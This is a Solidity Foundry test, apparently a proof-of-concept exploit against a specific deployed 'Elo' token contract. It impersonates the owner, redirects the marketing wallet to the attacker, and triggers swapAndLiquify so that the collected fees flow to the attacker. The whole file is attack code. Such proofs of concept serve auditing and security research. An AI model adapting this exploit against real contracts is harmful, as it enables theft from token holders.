contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    Elo elo;
    address owner;
    IUniswapV2Router02 router;
    address constant TARGET = 0x35207068e057a01861A654463c01B04cc111E760;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        elo = Elo(TARGET);
        owner = elo.owner();
        router = elo.uniswapV2Router();

        // Provide ample ETH for gas and liquidity
        deal(address(this), 200 ether);

        // Deal attacker a large amount of Elo tokens to provide liquidity and perform the attack
        deal(TARGET, address(this), 1_000_000 * 1e9);

        // Approve the router to spend our Elo tokens
        elo.approve(address(router), type(uint256).max);

        // Add liquidity to the Elo/WETH pair to enable swaps. This is the crucial fix.
        router.addLiquidityETH{value: 50 ether}(
            TARGET,         // The Elo token address
            500_000 * 1e9,  // Amount of Elo tokens to add
            0,              // amountTokenMin
            0,              // amountETHMin
            address(this),  // Recipient of LP tokens
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 newSwapThreshold = 1000 * 1e9; // 1000 Elo tokens

        vm.startPrank(owner);
        // Set a new, lower swap threshold
        elo.setNumTokensToAddLiquidity(newSwapThreshold);
        // Set the marketing wallet to the attacker's address
        elo.setMarketingWallet(payable(attacker));
        // Ensure swapAndLiquify is enabled
        elo.setSwapAndLiquifyEnabled(true);
        vm.stopPrank();

        // This transfer will cause fees to be collected by the contract.
        // We need collectedFees > newSwapThreshold.
        // Total fees for swap/liquify = liquidityFee(4) + marketingFee(5) = 9%.
        // transferAmount * 0.09 > 1000e9  => transferAmount > 1000e9 / 0.09 => ~11112e9
        // We transfer 12,000 tokens to be safe.
        elo.transfer(address(0xdead), 12000 * 1e9);

        // At this point, the contract has collected >1000 tokens in fees.
        // The next transfer will see that the contract's balance is above the threshold
        // and will trigger the swapAndLiquify function.
        elo.transfer(address(0xdead), 1);
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
